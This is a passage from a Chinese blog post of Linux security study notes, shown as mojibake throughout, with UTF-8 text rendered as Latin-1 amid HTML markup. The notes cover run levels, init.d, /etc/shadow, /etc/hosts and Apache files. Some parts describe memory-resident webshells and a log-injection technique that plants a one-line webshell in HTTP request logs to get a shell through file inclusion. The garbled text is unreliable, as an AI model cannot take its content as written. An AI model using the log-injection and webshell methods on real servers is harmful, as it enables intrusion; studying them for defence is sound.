ç¬¬ä¸€ï¼Œè¿›ç¨‹æ˜¯ä¸€ä¸ªå®ä½“ã€‚æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰å®ƒè‡ªå·±çš„åœ°å€ç©ºé—´ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒåŒ…æ‹¬æ–‡æœ¬åŒºåŸŸï¼ˆtext regionï¼‰ã€æ•°æ®åŒºåŸŸï¼ˆdata regionï¼‰å’Œå †æ ˆï¼ˆstack regionï¼‰ã€‚æ–‡æœ¬åŒºåŸŸå­˜å‚¨å¤„ç†å™¨æ‰§è¡Œçš„ä»£ç ï¼›æ•°æ®åŒºåŸŸå­˜å‚¨å˜é‡å’Œè¿›ç¨‹æ‰§è¡ŒæœŸé—´ä½¿ç”¨çš„åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼›å †æ ˆåŒºåŸŸå­˜å‚¨ç€æ´»åŠ¨è¿‡ç¨‹è°ƒç”¨çš„æŒ‡ä»¤å’Œæœ¬åœ°å˜é‡ã€‚</span><br><span class="line">Â â€‹</span><br><span class="line">Â ç¬¬äºŒï¼Œè¿›ç¨‹æ˜¯ä¸€ä¸ªâ€œæ‰§è¡Œä¸­çš„ç¨‹åºâ€ã€‚ç¨‹åºæ˜¯ä¸€ä¸ªæ²¡æœ‰ç”Ÿå‘½çš„å®ä½“ï¼Œåªæœ‰å¤„ç†å™¨èµ‹äºˆç¨‹åºç”Ÿå‘½æ—¶ï¼ˆæ“ä½œç³»ç»Ÿæ‰§è¡Œä¹‹ï¼‰ï¼Œå®ƒæ‰èƒ½æˆä¸ºä¸€ä¸ªæ´»åŠ¨çš„å®ä½“ï¼Œæˆ‘ä»¬ç§°å…¶ä¸ºè¿›ç¨‹ã€‚ </span><br><span class="line">Â è¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿä¸­æœ€åŸºæœ¬ã€é‡è¦çš„æ¦‚å¿µã€‚æ˜¯å¤šé“ç¨‹åºç³»ç»Ÿå‡ºç°åï¼Œä¸ºäº†åˆ»ç”»ç³»ç»Ÿå†…éƒ¨å‡ºç°çš„åŠ¨æ€æƒ…å†µï¼Œæè¿°ç³»ç»Ÿå†…éƒ¨å„é“ç¨‹åºçš„æ´»åŠ¨è§„å¾‹å¼•è¿›çš„ä¸€ä¸ªæ¦‚å¿µ,æ‰€æœ‰å¤šé“ç¨‹åºè®¾è®¡æ“ä½œç³»ç»Ÿéƒ½å»ºç«‹åœ¨è¿›ç¨‹çš„åŸºç¡€ä¸Šã€‚</span><br></pre></td></tr></table></figure><p><strong>å†…å®¹</strong></p><p>rc.dçš„å†…å®¹å¦‚ä¸‹: init.d&#x2F; :å„ç§æœåŠ¡å™¨å’Œç¨‹åºçš„äºŒè¿›åˆ¶æ–‡ä»¶å­˜æ”¾ç›®å½•ã€‚ rc[x].d&#x2F;: å„ä¸ª<strong>å¯åŠ¨çº§åˆ«</strong>çš„æ‰§è¡Œç¨‹åºè¿æ¥ç›®å½•ã€‚é‡Œå¤´çš„ä¸œè¥¿éƒ½æ˜¯æŒ‡å‘init.d&#x2F;çš„ä¸€äº›è½¯è¿æ¥ã€‚å…·ä½“çš„åè¾¹å™è¿°ã€‚ è¿˜æœ‰ä¸‰ä¸ªè„šæœ¬:rc.sysinit, rc, rc.local</p><p><strong>CentOSç›®å½•</strong>ï¼ˆæ³¨æ„kaliå’Œcentosç›®å½•ç»“æ„ç•¥æœ‰ä¸åŒï¼Œç½‘ä¸Šå¤§å¤šæ˜¯centosçš„ç›®å½•ç»“æ„ï¼‰</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026221707080-1024x373.png" style="zoom:50%;" /><p><strong>è¿è¡Œçº§åˆ«(run level)</strong></p><p>Initè¿›ç¨‹æ˜¯ç³»ç»Ÿå¯åŠ¨ä¹‹åçš„ç¬¬ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹ï¼Œæ‰€ä»¥å®ƒçš„pid(è¿›ç¨‹ç¼–å·)å§‹ç»ˆä¸º1ã€‚initè¿›ç¨‹ä¸Šæ¥é¦–å…ˆåšçš„äº‹æ˜¯å»è¯»å–&#x2F;etc&#x2F;ç›®å½•ä¸‹inittabæ–‡ä»¶ä¸­initdefault idå€¼ï¼Œè¿™ä¸ªå€¼ç§°ä¸ºè¿è¡Œçº§åˆ«(run-level)ã€‚å®ƒå†³å®šäº†ç³»ç»Ÿå¯åŠ¨ä¹‹åè¿è¡Œäºä»€ä¹ˆçº§åˆ«ã€‚è¿è¡Œçº§åˆ«å†³å®šäº†ç³»ç»Ÿå¯åŠ¨çš„ç»å¤§éƒ¨åˆ†è¡Œä¸ºå’Œç›®çš„ã€‚è¿™ä¸ªçº§åˆ«ä»0åˆ°6 ï¼Œå…·æœ‰ä¸åŒçš„åŠŸèƒ½ã€‚ä¸åŒçš„è¿è¡Œçº§å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Â 0 - åœæœºï¼ˆåƒä¸‡åˆ«æŠŠinitdefaultè®¾ç½®ä¸º0ï¼Œå¦åˆ™ç³»ç»Ÿæ°¸è¿œæ— æ³•å¯åŠ¨ï¼‰</span><br><span class="line">Â 1 - å•ç”¨æˆ·æ¨¡å¼</span><br><span class="line">Â 2 - å¤šç”¨æˆ·ï¼Œæ²¡æœ‰ NFS</span><br><span class="line">Â 3 - å®Œå…¨å¤šç”¨æˆ·æ¨¡å¼(æ ‡å‡†çš„è¿è¡Œçº§)</span><br><span class="line">Â 4 â€“ ç³»ç»Ÿä¿ç•™çš„</span><br><span class="line">Â 5 - X11 ï¼ˆx window)</span><br><span class="line">Â 6 - é‡æ–°å¯åŠ¨ ï¼ˆåƒä¸‡ä¸è¦æŠŠinitdefault è®¾ç½®ä¸º6ï¼Œå¦åˆ™å°†ä¸€ç›´åœ¨é‡å¯ ï¼‰</span><br></pre></td></tr></table></figure><p>rc.dåŒ…å«è®¸å¤šç³»ç»ŸæœåŠ¡çš„å¯åŠ¨å’Œåœæ­¢<strong>è„šæœ¬</strong>ã€‚å®ƒæ§åˆ¶ç€æ‰€æœ‰ä» acpid åˆ° x11-common çš„å„ç§äº‹åŠ¡ã€‚</p><h6 id="etc-init-d"><a href="#etc-init-d" class="headerlink" title="&#x2F;etc&#x2F;init.d"></a>&#x2F;etc&#x2F;init.d</h6><p>ç›®å½• <code>/etc/init.d</code> æ˜¯<strong>ç¬¦å·é“¾æ¥æ–‡ä»¶</strong>ï¼Œå®é™…ä¸Šæ˜¯é“¾æ¥åˆ°ç›®å½• <strong>&#x2F;etc&#x2F;rc.d&#x2F;init.d</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026222100823-1024x72.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20210521100903155.jpg"></p><p>(kaliç³»ç»Ÿä¸‹)init.dä¸­çš„è„šæœ¬æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Â init.dé‡Œé¢æ”¾çš„éƒ½æ˜¯ä»€ä¹ˆä¸œè¥¿?è¿™ä¸ªç›®å½•å­˜æ”¾çš„æ˜¯ä¸€äº›è„šæœ¬ï¼Œä¸€èˆ¬æ˜¯linuxä»¥rpmåŒ…å®‰è£…æ—¶è®¾å®šçš„ä¸€äº›æœåŠ¡çš„å¯åŠ¨è„šæœ¬ã€‚ç³»ç»Ÿåœ¨å®‰è£…æ—¶è£…äº†å¥½å¤šrpmåŒ…ï¼Œè¿™é‡Œé¢å°±æœ‰å¾ˆå¤šå¯¹åº”çš„è„šæœ¬ã€‚æ‰§è¡Œè¿™äº›è„šæœ¬å¯ä»¥ç”¨æ¥å¯åŠ¨ï¼Œåœæ­¢ï¼Œé‡å¯è¿™äº›æœåŠ¡ã€‚</span><br><span class="line">Â å‰é¢è¯´åˆ°ï¼Œ/etc/rc.d/init.dè¿™ä¸ªç›®å½•ä¸‹çš„è„šæœ¬å°±ç±»ä¼¼ä¸windowsä¸­çš„æ³¨å†Œè¡¨ï¼Œåœ¨ç³»ç»Ÿå¯åŠ¨çš„æ—¶å€™æ‰§è¡Œã€‚ç¨‹åºè¿è¡Œåˆ°è¿™é‡Œ(initè¿›ç¨‹è¯»å–äº†è¿è¡Œçº§åˆ«)ï¼Œç›¸ä¿¡ä»å‘½åçš„è§’åº¦å¤§å®¶ä¹Ÿèƒ½çŒœåˆ°è¯¥è¿è¡Œ/etc/rc.d/init.dé‡Œé¢çš„è„šæœ¬äº†ï¼Œä¸ç„¶å®ƒä¸ºä»€ä¹ˆä¹Ÿå«init(.d)å‘¢æ˜¯å§ã€‚æ²¡é”™ï¼Œæ˜¯è¯¥è¿è¡Œinit.dé‡Œçš„è„šæœ¬äº†ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯ç›´æ¥è¿è¡Œï¼Œè€Œæ˜¯æœ‰é€‰æ‹©çš„å› ä¸ºç³»ç»Ÿå¹¶ä¸éœ€è¦å¯åŠ¨æ‰€æœ‰çš„æœåŠ¡ã€‚</span><br><span class="line">Â  Â   é‚£ä¹ˆï¼Œç³»ç»Ÿæ˜¯å¦‚ä½•é€‰æ‹©å“ªäº›éœ€è¦å¯åŠ¨å“ªäº›ä¸è¦å‘¢ï¼Ÿè¿™æ—¶åˆšæ‰è¯´çš„è¿è¡Œçº§åˆ«å°±èµ·ä½œç”¨äº†ã€‚</span><br><span class="line">Â  Â   åœ¨å†³å®šäº†ç³»ç»Ÿå¯åŠ¨çš„run levelä¹‹åï¼Œ/etc/rc.d/rcè¿™ä¸ªè„šæœ¬å…ˆæ‰§è¡Œã€‚åœ¨RH9å’ŒFC7çš„æºç ä¸­å®ƒéƒ½æ˜¯ä¸€ä¸Šæ¥å°±check_runlevel()ï¼ˆè™½ç„¶å®ç°çš„ä»£ç ä¸ä¸€æ ·ï¼Œä¹Ÿå¤§åŒå°å¼‚ï¼‰ï¼ŒçŸ¥é“äº†è¿è¡Œçº§åˆ«ä¹‹åï¼Œå¯¹äºæ¯ä¸€ä¸ªè¿è¡Œçº§åˆ«ï¼Œåœ¨rc.dä¸‹éƒ½æœ‰ä¸€ä¸ªå­ç›®å½•åˆ†åˆ«æ˜¯rc0.dï¼Œrc1.d â€¦.. rc6.dã€‚æ¯ä¸ªç›®å½•ä¸‹éƒ½æ˜¯åˆ°init.dç›®å½•çš„ä¸€éƒ¨åˆ†è„šæœ¬ä¸€äº›é“¾æ¥ã€‚æ¯ä¸ªçº§åˆ«è¦æ‰§è¡Œå“ªäº›æœåŠ¡å°±åœ¨ç›¸å¯¹åº”çš„ç›®å½•ä¸‹ï¼Œæ¯”å¦‚çº§åˆ«5è¦å¯åŠ¨çš„æœåŠ¡å°±éƒ½æ”¾åœ¨rc5.dä¸‹ï¼Œä½†æ˜¯æ”¾åœ¨è¿™ä¸ªrc5.dä¸‹çš„éƒ½æ˜¯ä¸€äº›é“¾æ¥æ–‡ä»¶ï¼Œé“¾æ¥åˆ°init.dä¸­ç›¸å¯¹åº”çš„æ–‡ä»¶ï¼ŒçœŸæ­£å¹²æ´»çš„init.dé‡Œçš„è„šæœ¬ã€‚</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026210635328-1024x410.png" style="zoom: 67%;" /><p><strong>æ”¾é©¬</strong></p><p>è¿™ä¸ªæ–‡ä»¶å…³äºè®¡åˆ’ä»»åŠ¡ï¼Œè¿™ä¸­é—´å°±å­˜åœ¨ä¸€å®šçš„æ”¾é©¬æ”»å‡»ã€‚</p><p><strong>å†…å­˜é©¬çš„3å¤§ç‰¹ç‚¹</strong> å†…å­˜é©¬çš„æ¦‚å¿µç‰¹æ€§ï¼Œé™¤äº†éšè”½æ€§ã€ä¸æ˜“è¢«å¯Ÿè§‰ä»¥å¤–ï¼Œå…¶è¿˜æœ‰å¦‚ä¸‹å‡ ä¸ªç‰¹ç‚¹ï¼š1ã€å†…å­˜é©¬æ— é€»è¾‘ç»“æ„è¾¹ç•Œï¼Œéš¾ä»¥è¢«å‘ç°ã€‚å†…å­˜é©¬ä»…å­˜åœ¨äºè¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ï¼Œé€šå¸¸ä¸æ­£å¸¸çš„&#x2F;åˆæ³•çš„ä»£ç ã€æ•°æ®æ··æ·†ã€‚å†…å­˜é©¬ä¸ä¼ ç»Ÿæ¶æ„ä»£ç çš„ä¸åŒä¹‹å¤„åœ¨äºå®ƒæ²¡æœ‰ç£ç›˜æ–‡ä»¶ï¼Œä¼šå¯¼è‡´ä¼ ç»Ÿçš„æ£€æµ‹é˜²æŠ¤æ‰‹æ®µå¤±æ•ˆã€‚2ã€å†…å­˜é©¬ç¼ºä¹ç¨³å®šçš„é™æ€ç‰¹å¾ï¼Œéš¾ä»¥è¢«è¯†åˆ«ã€‚å†…å­˜é©¬ç¼ºä¹ç»“æ„åŒ–çš„é™æ€å½¢å¼ï¼Œå®ƒä¾é™„åœ¨è¿›ç¨‹è¿è¡ŒæœŸé—´çš„è¾“å…¥æ•°æ®è¿›å…¥è¿›ç¨‹ï¼Œæ•°æ®å¯èƒ½è¢«åŠ å¯†æ··æ·†ï¼Œå› æ­¤ï¼Œæ— æ³•é€šè¿‡ç‰¹å¾è¯†åˆ«å†…å­˜é©¬ã€‚3ã€ å†…å­˜é©¬ç§ç±»å¤šï¼Œæ£€æµ‹æœºåˆ¶å¤æ‚è€Œå¤šæ ·ã€‚å†…å­˜é©¬æœ‰äºŒè¿›åˆ¶ä»£ç ç‰‡æ®µï¼ˆShellcodeï¼‰ã€PowerShellè„šæœ¬ã€Webä¸­é—´ä»¶ç­‰ç±»å‹ï¼Œæ¯ç§ç±»å‹åˆå¯ç»†åˆ†ï¼Œä¸åŒç±»å‹å†…å­˜é©¬çš„æ‰§è¡Œæ–¹å¼ã€æ¶æ„ä»£ç &#x2F;è¡Œä¸ºè§¦å‘æœºåˆ¶å„ä¸ç›¸åŒã€‚</p><h6 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="&#x2F;etc&#x2F;shadow"></a>&#x2F;etc&#x2F;shadow</h6><p>ç”¨äºå­˜å‚¨ Linux ç³»ç»Ÿä¸­ç”¨æˆ·çš„å¯†ç ä¿¡æ¯,è¢«ç§°ä¸ºâ€™å½±å­æ–‡ä»¶â€˜</p><p>åœ¨å®‰è£…äº†å½±å­å£ä»¤è½¯ä»¶çš„ç³»ç»Ÿä¸Šçš„å½±å­å£ä»¤æ–‡ä»¶.å½±å­å£ä»¤æ–‡ä»¶å°†&#x2F;etc&#x2F;passwd æ–‡ä»¶ä¸­çš„åŠ å¯†å£ä»¤ç§»åŠ¨åˆ°&#x2F;etc&#x2F;shadowä¸­ï¼Œè€Œåè€…åªå¯¹rootå¯è¯».è¿™ä½¿ç ´è¯‘å£ä»¤æ›´å›°éš¾.</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026222757599-1024x83.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Â æ¯ä¸ªå­—æ®µå«ä¹‰ï¼š</span><br><span class="line">Â ç”¨æˆ·åï¼šåŠ å¯†å¯†ç ï¼šæœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ï¼šæœ€å°ä¿®æ”¹æ—¶é—´é—´éš”ï¼šå¯†ç æœ‰æ•ˆæœŸï¼šå¯†ç éœ€è¦å˜æ›´å‰çš„è­¦å‘Šå¤©æ•°ï¼šå¯†ç è¿‡æœŸåçš„å®½é™æ—¶é—´ï¼šè´¦å·å¤±æ•ˆæ—¶é—´ï¼šä¿ç•™å­—æ®µ</span><br></pre></td></tr></table></figure><p>å¯¹äº<strong>åŠ å¯†å¯†ç </strong>ï¼š</p><p>è¿™é‡Œä¿å­˜çš„æ˜¯çœŸæ­£åŠ å¯†çš„å¯†ç ã€‚ç›®å‰ Linux çš„å¯†ç é‡‡ç”¨çš„æ˜¯ <strong>SHA512</strong> æ•£åˆ—åŠ å¯†ç®—æ³•ï¼ŒåŸæ¥é‡‡ç”¨çš„æ˜¯ MD5 æˆ– DES åŠ å¯†ç®—æ³•ã€‚SHA512 æ•£åˆ—åŠ å¯†ç®—æ³•çš„åŠ å¯†ç­‰çº§æ›´é«˜ï¼Œä¹Ÿæ›´åŠ å®‰å…¨ã€‚</p><h6 id="etc-hosts"><a href="#etc-hosts" class="headerlink" title="&#x2F;etc&#x2F;hosts"></a>&#x2F;etc&#x2F;hosts</h6><p>hostsæ–‡ä»¶æ˜¯linuxç³»ç»Ÿä¸­è´Ÿè´£<strong>ipåœ°å€ä¸åŸŸåå¿«é€Ÿè§£æ</strong>çš„æ–‡ä»¶ï¼ˆå’ŒWindowsæ˜¯ä¸€æ ·çš„æï¼‰</p><p>hostsæ–‡ä»¶åŒ…å«äº†ipåœ°å€å’Œä¸»æœºåä¹‹é—´çš„æ˜ å°„ï¼ŒåŒ…æ‹¬ä¸»æœºåçš„åˆ«åï¼Œåœ¨æ²¡æœ‰åŸŸåæœåŠ¡å™¨çš„æƒ…å†µä¸‹ï¼Œç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç½‘ç»œç¨‹åºéƒ½é€šè¿‡æŸ¥è¯¢è¯¥æ–‡ä»¶æ¥è§£æå¯¹åº”äºæŸä¸ªä¸»æœºåçš„ipåœ°å€ï¼Œå¦åˆ™å°±éœ€è¦ä½¿ç”¨DNSæœåŠ¡ç¨‹åºæ¥è§£å†³ã€‚é€šå¸¸å¯ä»¥å°†å¸¸ç”¨çš„åŸŸåå’Œipåœ°å€æ˜ å°„åŠ å…¥åˆ°hostsæ–‡ä»¶ä¸­ï¼Œå®ç°å¿«é€Ÿæ–¹ä¾¿çš„è®¿é—® ä¼˜å…ˆçº§ï¼šdnsç¼“å­˜&gt;hosts&gt;dnsæœåŠ¡</p><p><strong>æ ¼å¼</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â ipåœ°å€ ä¸»æœºå/åŸŸå ï¼ˆä¸»æœºåˆ«åï¼‰</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221026225531886-1024x80.png"></p><h4 id="webæœåŠ¡å™¨é‡è¦æ–‡ä»¶"><a href="#webæœåŠ¡å™¨é‡è¦æ–‡ä»¶" class="headerlink" title="webæœåŠ¡å™¨é‡è¦æ–‡ä»¶"></a>webæœåŠ¡å™¨é‡è¦æ–‡ä»¶</h4><h6 id="apache"><a href="#apache" class="headerlink" title="apache"></a><strong>apache</strong></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â #/etc/apache2</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027192501209-1024x398.png" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â #/etc/apcche2/apache2.conf  -&gt;é…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>apache2.confæ˜¯ä¸ªä¸»é…ç½®æ–‡ä»¶ï¼Œå½“apache2æœåŠ¡å™¨å¯åŠ¨æ—¶ï¼Œå°±å°†é›¶æ•£çš„é…ç½®æ–‡ä»¶ä»¥Includingæ–¹å¼ç»„åˆåœ¨ä¸€èµ·ã€‚çœ‹åˆ°è¿™ï¼Œä½ å°±åº”è¯¥çŸ¥é“äº†ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸æ˜¯çœŸæ­£çš„å…·ä½“é…ç½®æ–‡ä»¶ï¼Œå®ƒåªæ˜¯æŠŠå„ä¸ªé›¶æ•£çš„é…ç½®æ–‡ä»¶ä»¥inlucedingæ–¹å¼åŒ…å«è¿›æ¥ã€‚apache2.confå…¶å®å°±æ˜¯è´Ÿè´£è°ƒç”¨å…¶ä»–é…ç½®æ–‡ä»¶çš„ã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027192850010.png" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â #/etc/apche2/ports.conf  -&gt;ç«¯å£é…ç½®</span><br></pre></td></tr></table></figure><p>ports.cnfè®°å½•äº†æœåŠ¡å™¨ä½¿ç”¨çš„ç«¯å£å·ï¼Œé»˜è®¤ç›‘å¬Listen80ï¼Œå»ºç«‹è‡ªå·±çš„ç½‘ç«™éœ€è¦åœ¨è¿™é‡Œæ·»åŠ ç½‘ç«™çš„ç«¯å£å·ï¼Œå¦åˆ™æ— æ³•è®¿é—®ã€‚</p><p>&lt;IfModule ssl_module&gt; Listen 443 </IfModule> è¡¨ç¤ºå½“ssl_moduleå¯åŠ¨æ—¶ï¼Œè¿›è¡Œ443ç«¯å£çš„ç›‘å¬ã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027193104696-1024x429.png" style="zoom:50%;" /><p>sites-enabledæ˜¯apache2<strong>æ­£åœ¨ä½¿ç”¨çš„ç½‘ç«™é…ç½®æ–‡ä»¶</strong>ï¼Œsites-availableæ˜¯apache2<strong>å¯ç”¨çš„ç½‘ç«™é…ç½®æ–‡ä»¶</strong>ã€‚</p><p>enabledä¸­åªæœ‰ä¸€ä¸ª000-default.confå¿«æ·æ–¹å¼ã€‚availbelä¸­æœ‰ä¸€ä¸ª000-default.confå’Œdefault-ssl.confä¸¤ä¸ªæ–‡ä»¶ã€‚</p><p>000-default.confæ˜¯<strong>ä½¿ç”¨httpåè®®ç½‘ç«™çš„é»˜è®¤ç½‘ç«™é…ç½®æ–‡ä»¶</strong>ï¼Œè€Œdefault-ss.confæ˜¯<strong>httpsåè®®ç½‘ç«™æ‰ä½¿ç”¨çš„é»˜è®¤ç½‘ç«™é…ç½®æ–‡ä»¶</strong>ã€‚httpsè¿˜éœ€è¦ç”³è¯·sslè¯ä¹¦ã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027193634755-1024x172.png" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â #/etc/apache2/sites-available/000-default.conf  -&gt;ä½¿ç”¨httpåè®®ç½‘ç«™çš„é»˜è®¤ç½‘ç«™é…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027193903339-1024x493.png" style="zoom:50%;" /><p><strong>ServerAdmin</strong>ï¼š è®¾ç½®ä¸€ä¸ªé‚®ä»¶åœ°å€ï¼Œå¦‚æœæœåŠ¡å™¨æœ‰ä»»ä½•é—®é¢˜å°†å‘ä¿¡åˆ°è¿™ä¸ªåœ°å€ï¼Œ è¿™ä¸ªåœ°å€ä¼šåœ¨æœåŠ¡å™¨äº§ç”Ÿçš„æŸäº›é¡µé¢ä¸­å‡ºç°ã€‚</p><p><strong>DocumentRoot</strong> æ˜¯è¿™ä¸ªç«™ç‚¹çš„æ ¹ç›®å½•ï¼Œè¿™æ · Apache2 å¯åŠ¨æ—¶ä¼šæ‰«æ &#x2F;etc&#x2F;apache2&#x2F;sites-enabled ä¸­å¯ç”¨çš„ website é…ç½®å¹¶åŠ è½½ã€‚</p><p>å½“ç”¨æˆ·è®¿é—®localhost:80 æ—¶ï¼ŒApache2 å°±å°† default ç«™ç‚¹æ ¹ç›®å½• &#x2F;var&#x2F;www&#x2F;html ä¸‹çš„index.htmlï¼ˆæˆ– index.PHP ç­‰ï¼Œå¯é…ç½®ï¼‰ä½œä¸ºè¯·æ±‚çš„å›åº”è¿”å›ç»™æµè§ˆå™¨ï¼Œç„¶åä½ èƒ½æ¬£èµåˆ°çš„å°±æ˜¯ &#x2F;var&#x2F;www&#x2F;html&#x2F;index.html è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â #/var/www/html Â  -&gt;  ç½‘ç«™æ ¹ç›®å½•</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027200644069-1024x155.png" style="zoom:50%;" /><p>ä¾‹å¦‚ï¼Œ&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027200821690-1024x406.png" style="zoom: 50%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â # /var/log/apache2  -ã€‹æ—¥å¿—æ–‡ä»¶</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027201546949-1024x290.png" style="zoom: 50%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027202238355-1-1024x173.png" style="zoom: 67%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027202238355-1024x173.png" style="zoom:67%;" /><p><strong>ip æ—¶é—´ è¯·æ±‚æ–¹å¼&#x2F;è¯·æ±‚èµ„æº åè®®çŠ¶æ€ç  æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€çš„å­—èŠ‚æ•° è®°å½•ä»å“ªä¸ªé¡µé¢é“¾æ¥è®¿é—®æ¥çš„ï¼ˆéé¡µé¢è®¿é—®åˆ™ä¸º-ï¼‰ å®¢æˆ·æµè§ˆå™¨ä¿¡æ¯ï¼ˆUAï¼‰ ï¼ˆè¯·æ±‚ä»£ç†å­—ç¬¦ä¸²ï¼‰</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221027202105222-1024x98.png"></p><p>æ—¥å¿—æ³¨å…¥(ç‹­ä¹‰)ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Â #ä¸­é—´ä»¶çš„æ—¥å¿—æ–‡ä»¶ä¼šä¿å­˜ç½‘ç«™çš„è®¿é—®è®°å½•,æ¯”å¦‚HTTPè¯·æ±‚è¡Œ,User-Agent,Refererç­‰å®¢æˆ·ç«¯ä¿¡æ¯</span><br><span class="line">Â #å¦‚æœåœ¨HTTPè¯·æ±‚ä¸­æ’å…¥æ¶æ„ä»£ç ,é‚£ä¹ˆæ¶æ„ä»£ç å°±ä¼šä¿å­˜åˆ°æ—¥å¿—æ–‡ä»¶ä¸­,è®¿é—®æ—¥å¿—æ–‡ä»¶çš„æ—¶å€™,æ—¥å¿—æ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç å°±ä¼šæ‰§è¡Œ,ä»è€Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œç”šè‡³è·å–shell</span><br><span class="line">Â #æ¯”å¦‚ä½¿ç”¨ä»£ç†å·¥å…·æŠ“åŒ…,åœ¨HTTPè¯·æ±‚ä¸­æ’å…¥ä¸€å¥è¯æœ¨é©¬,è®¿é—®æ—¥å¿—æ–‡ä»¶æ—¶ä¼šæ‰§è¡Œä¸€å¥è¯æœ¨é©¬,ç„¶åä½¿ç”¨èšå‰‘ç­‰å·¥å…·é“¾æ¥,ä»è€Œgetshellï¼ˆç»“åˆæ–‡ä»¶åŒ…å«æ¼æ´ï¼‰</span><br><span class="line">Â urlï¼šhttps://blog.csdn.net/wangyuxiang946/article/details/119832592</span><br></pre></td></tr></table></figure><p>è¡¥å……ï¼š<strong>æ—¥å¿—æ–‡ä»¶</strong></p><p>æ¨èé˜…è¯»ï¼š<a href="https://zhuanlan.zhihu.com/p/298335887">https://zhuanlan.zhihu.com/p/298335887</a></p><p><strong>ä½œç”¨</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â æ—¥å¿—æ–‡ä»¶ç”¨äºè®°å½•linuxç³»ç»Ÿçš„å„ç§è¿è¡Œä¿¡æ¯çš„æ–‡ä»¶ï¼Œç›¸å½“äºlinuxä¸»æœºçš„æ—¥è®°ï¼Œä¸åŒçš„æ—¥å¿—æ–‡ä»¶è®°è½½äº†ä¸åŒç±»å‹çš„ä¿¡æ¯,å¦‚Linuxå†…æ ¸æ¶ˆæ¯ã€ç”¨æˆ·ç™»å½•äº‹ä»¶ã€ç¨‹åºé”™è¯¯ç­‰ã€‚. æ—¥å¿—æ–‡ä»¶å¯¹äºè¯Šæ–­å’Œè§£å†³é—®é¢˜å¾ˆæœ‰å¸®åŠ©ï¼Œå› ä¸ºlinuxè¿è¡Œçš„ç¨‹åºé€šå¸¸æŠŠç³»ç»Ÿçš„æ¶ˆæ¯å’Œé”™è¯¯å†™å…¥å¯¹åº”çš„æ—¥å¿—æ–‡ä»¶ï¼Œè¿™æ ·ç³»ç»Ÿå¯ä»¥æœ‰æ®å¯æŸ¥ï¼Œ 